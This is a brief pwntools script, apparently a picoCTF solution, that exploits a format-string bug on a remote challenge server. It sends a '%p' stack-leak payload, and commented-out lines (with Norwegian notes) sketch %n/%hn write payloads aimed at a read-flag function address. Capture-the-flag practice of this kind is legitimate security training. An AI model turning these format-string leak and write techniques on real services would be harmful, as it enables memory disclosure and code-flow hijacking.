from pwn import *

#p = process("./vuln")
#gdb.attach(p)

p = remote("saturn.picoctf.net",62732)

read_flag = 0x080492b6
read_flag2 = 0x080492b8
# ret_main = 0x8049418 arg 55
prt1 = 0x0804
prt2 = 0x92b6

# AAAA%<value-4>x%7$n skriver 4 + value - 4 bytes til det 7ende argumentet på stacken
# ville vært payload = f"AAAA%{read_flag-4}x%55$n".encode()

# \xac\xf6\xff\xbf\xae\xf6\xff\xbf%47798x%7$hn%4160x%8$hn 
# hn skriver til small ints (2 bytes), så skriver først liten verdi til det først, og en større til det andre (for å unngå å printe for alltid)

# payload = b"AAAA"
# payload = p32(read_flag2)+p32(read_flag)
# payload += f"{prt1-8}x%56$hn{prt2-prt1-8}x%55$hn".encode()

# doesnt work, but the flag gets leaked so....



p.sendline(b"%p"*80)

p.interactive()